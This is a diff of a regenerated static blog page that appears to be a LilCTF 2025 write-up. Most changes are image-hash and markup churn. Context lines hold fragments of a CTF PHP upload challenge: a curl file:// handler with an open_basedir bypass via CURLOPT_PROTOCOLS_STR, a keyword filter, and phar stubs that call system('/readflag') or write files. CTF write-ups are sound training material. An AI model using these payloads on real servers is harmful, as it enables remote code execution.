+	srcset="/p/2025-lilctf/image-20250906223016195_hu_e457f52f38300d46.png 480w, /p/2025-lilctf/image-20250906223016195_hu_8b49ede8e8c678f4.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906223016195"
@@ -2208,7 +2208,7 @@
 <p><img src="/p/2025-lilctf/image-20250906214922921.png"
 	width="1426"
 	height="337"
-	srcset="/p/2025-lilctf/image-20250906214922921_hu_85fac43e898dd615.png 480w, /p/2025-lilctf/image-20250906214922921_hu_2954ee6ef08fbe43.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906214922921_hu_70c2ca566c866e03.png 480w, /p/2025-lilctf/image-20250906214922921_hu_df502ed910398a93.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906214922921"
@@ -2223,7 +2223,7 @@
 <p><img src="/p/2025-lilctf/image-20250906215251900.png"
 	width="731"
 	height="328"
-	srcset="/p/2025-lilctf/image-20250906215251900_hu_45bc718015e27963.png 480w, /p/2025-lilctf/image-20250906215251900_hu_96594a4d32a9a65a.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906215251900_hu_fb4f601289d92d07.png 480w, /p/2025-lilctf/image-20250906215251900_hu_51244d84e82865ed.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906215251900"
@@ -2238,7 +2238,7 @@
 <p><img src="/p/2025-lilctf/image-20250906215452394.png"
 	width="618"
 	height="209"
-	srcset="/p/2025-lilctf/image-20250906215452394_hu_477f31f7b37e1954.png 480w, /p/2025-lilctf/image-20250906215452394_hu_b358f5acce2134e5.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906215452394_hu_36d96966eebcd003.png 480w, /p/2025-lilctf/image-20250906215452394_hu_9e8c2375c76015ba.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906215452394"
@@ -2358,7 +2358,7 @@
 <p><img src="/p/2025-lilctf/image-20250906220945440.png"
 	width="1370"
 	height="851"
-	srcset="/p/2025-lilctf/image-20250906220945440_hu_9f747ce9b7cea1a6.png 480w, /p/2025-lilctf/image-20250906220945440_hu_4b9a347843500fa3.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906220945440_hu_73ec32e70749ec5c.png 480w, /p/2025-lilctf/image-20250906220945440_hu_606ef6035e143c74.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906220945440"
@@ -2517,7 +2517,7 @@
 </div><p><img src="/p/2025-lilctf/image-20250906223147834.png"
 	width="1903"
 	height="397"
-	srcset="/p/2025-lilctf/image-20250906223147834_hu_9f313d35c402e72f.png 480w, /p/2025-lilctf/image-20250906223147834_hu_5821e37b61f9c2f9.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906223147834_hu_8b0bd0233f37683e.png 480w, /p/2025-lilctf/image-20250906223147834_hu_5ec4a49ffb74a527.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906223147834"
@@ -2532,7 +2532,7 @@
 <p><img src="/p/2025-lilctf/image-20250906223441861.png"
 	width="1308"
 	height="126"
-	srcset="/p/2025-lilctf/image-20250906223441861_hu_c2c1d7165bd84160.png 480w, /p/2025-lilctf/image-20250906223441861_hu_3f1745730a3da0d7.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906223441861_hu_6b79e2156875fa6a.png 480w, /p/2025-lilctf/image-20250906223441861_hu_976aa5e14cf98704.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906223441861"
@@ -2546,7 +2546,7 @@
 <p><img src="/p/2025-lilctf/image-20250906223427171.png"
 	width="1508"
 	height="579"
-	srcset="/p/2025-lilctf/image-20250906223427171_hu_aa59631434e3fe7a.png 480w, /p/2025-lilctf/image-20250906223427171_hu_1d30d2fffe6e8fae.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906223427171_hu_ebd63f562b720133.png 480w, /p/2025-lilctf/image-20250906223427171_hu_ef8170fd55949131.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906223427171"
@@ -2630,14 +2630,14 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">// 上传文件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/tmp/&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$orig</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file://&#39;</span><span class="o">.</span> <span class="nv">$orig</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="c1">// I hide a trick to bypass open_basedir, I&#39;m sure you can find it.
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
@@ -2688,7 +2688,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="s">    system(&#39;/readflag&#39;);
 </span></span></span><span class="line"><span class="cl"><span class="s">    __HALT_COMPILER();
 </span></span></span><span class="line"><span class="cl"><span class="s">?&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="dl">STUB</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="dl">STUB</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$stub</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">);</span>
@@ -2705,7 +2705,7 @@
 <p><img src="/p/2025-lilctf/image-20250907152652546.png"
 	width="729"
 	height="879"
-	srcset="/p/2025-lilctf/image-20250907152652546_hu_9ef499fcf2c4547d.png 480w, /p/2025-lilctf/image-20250907152652546_hu_f8f43af359aee9f.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907152652546_hu_3b633aaa6220cca7.png 480w, /p/2025-lilctf/image-20250907152652546_hu_5b6ffe884d71a1a8.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907152652546"
@@ -2756,7 +2756,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="s">  file_put_contents($filename, $content);
 </span></span></span><span class="line"><span class="cl"><span class="s">        __HALT_COMPILER();
 </span></span></span><span class="line"><span class="cl"><span class="s">?&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="dl">STUB</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="dl">STUB</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$stub</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">);</span>
@@ -2773,7 +2773,7 @@
 <p><img src="/p/2025-lilctf/image-20250907160422522.png"
 	width="680"
 	height="71"
-	srcset="/p/2025-lilctf/image-20250907160422522_hu_3b60858e4a24cdc7.png 480w, /p/2025-lilctf/image-20250907160422522_hu_95abbea5241c5431.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907160422522_hu_1c38efbbc569f4dd.png 480w, /p/2025-lilctf/image-20250907160422522_hu_dc4dc5703cabd1a0.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907160422522"
@@ -2796,7 +2796,7 @@
 </div><p><img src="/p/2025-lilctf/image-20250907153947878.png"
 	width="1502"
 	height="308"
-	srcset="/p/2025-lilctf/image-20250907153947878_hu_9acbffc6e78801a7.png 480w, /p/2025-lilctf/image-20250907153947878_hu_5d9ef70109171111.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907153947878_hu_45af8383ce0c0586.png 480w, /p/2025-lilctf/image-20250907153947878_hu_4a64d862ddb1c001.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907153947878"
@@ -2876,13 +2876,13 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">// 上传文件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/tmp/&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$orig</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file://&#39;</span><span class="o">.</span> <span class="nv">$orig</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_PROTOCOLS_STR</span><span class="p">,</span> <span class="s2">&#34;all&#34;</span><span class="p">);</span> <span class="c1">// secret trick to bypass, omg why will i show it to you!
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;&lt;?&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;halt&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
@@ -2919,7 +2919,7 @@
 </div><p><img src="/p/2025-lilctf/image-20250907163020663.png"
 	width="1494"
 	height="550"
-	srcset="/p/2025-lilctf/image-20250907163020663_hu_38eec6eca5335063.png 480w, /p/2025-lilctf/image-20250907163020663_hu_90210914da7908f5.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907163020663_hu_ef63ac775f6b8fbc.png 480w, /p/2025-lilctf/image-20250907163020663_hu_c89193ac94c13649.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907163020663"
@@ -2937,7 +2937,7 @@
 <p><img src="/p/2025-lilctf/image-20250907164030664.png"
 	width="1893"
 	height="553"
-	srcset="/p/2025-lilctf/image-20250907164030664_hu_33f2c80d1b614e4.png 480w, /p/2025-lilctf/image-20250907164030664_hu_fc500497de9d056d.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907164030664_hu_3c837155ebae319c.png 480w, /p/2025-lilctf/image-20250907164030664_hu_9ee69583b7749f3d.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907164030664"
@@ -2952,7 +2952,7 @@
 <p><img src="/p/2025-lilctf/image-20250907164740982.png"
 	width="1905"
 	height="642"
-	srcset="/p/2025-lilctf/image-20250907164740982_hu_2dd034175e2f27ee.png 480w, /p/2025-lilctf/image-20250907164740982_hu_5f4d7ccf31af04c.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907164740982_hu_cb2f92aff39b1e.png 480w, /p/2025-lilctf/image-20250907164740982_hu_46e202313955eb97.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907164740982"
@@ -3694,7 +3694,7 @@
 </div><p><img src="/p/2025-lilctf/image-20250907210844936.png"
 	width="1852"
 	height="983"
-	srcset="/p/2025-lilctf/image-20250907210844936_hu_d2a5ab9e2fc1b94e.png 480w, /p/2025-lilctf/image-20250907210844936_hu_af18b4d4befc0b8a.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907210844936_hu_b7c4036c4f79bcd8.png 480w, /p/2025-lilctf/image-20250907210844936_hu_4959e4e927097ee2.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907210844936"
@@ -3717,7 +3717,7 @@
 </div><p><img src="/p/2025-lilctf/image-20250907220146464.png"
 	width="1514"
 	height="582"
-	srcset="/p/2025-lilctf/image-20250907220146464_hu_db88b2d1de450e32.png 480w, /p/2025-lilctf/image-20250907220146464_hu_86677668cd4b6954.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907220146464_hu_2c3bc304fb7e5811.png 480w, /p/2025-lilctf/image-20250907220146464_hu_a1da96c7bda57e25.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907220146464"
@@ -3732,7 +3732,7 @@
 <p><img src="/p/2025-lilctf/image-20250907220152844.png"
 	width="1615"
 	height="295"
-	srcset="/p/2025-lilctf/image-20250907220152844_hu_31d6d231891203c0.png 480w, /p/2025-lilctf/image-20250907220152844_hu_7c2d1a11b4acdb4f.png 1024w"
+	srcset="/p/2025-lilctf/image-20250907220152844_hu_33e4035345793258.png 480w, /p/2025-lilctf/image-20250907220152844_hu_78c2959b8ff1cc09.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250907220152844"
@@ -3825,7 +3825,7 @@
 <p><img src="/p/2025-lilctf/image-20250909101202359.png"
 	width="1235"
 	height="363"
-	srcset="/p/2025-lilctf/image-20250909101202359_hu_c0293d1f41f70855.png 480w, /p/2025-lilctf/image-20250909101202359_hu_d8a96fe1ec38c4ea.png 1024w"
+	srcset="/p/2025-lilctf/image-20250909101202359_hu_94640c216dffb422.png 480w, /p/2025-lilctf/image-20250909101202359_hu_88e4ac3affec99bf.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250909101202359"
@@ -3839,7 +3839,7 @@
 <p><img src="/p/2025-lilctf/image-20250909101224130.png"
 	width="1115"
 	height="230"
-	srcset="/p/2025-lilctf/image-20250909101224130_hu_242ddb2a37eaf882.png 480w, /p/2025-lilctf/image-20250909101224130_hu_64f3caf7c65b29f5.png 1024w"
+	srcset="/p/2025-lilctf/image-20250909101224130_hu_438aa7252306d2c0.png 480w, /p/2025-lilctf/image-20250909101224130_hu_2599d7bb780e82d2.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250909101224130"
@@ -4014,7 +4014,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
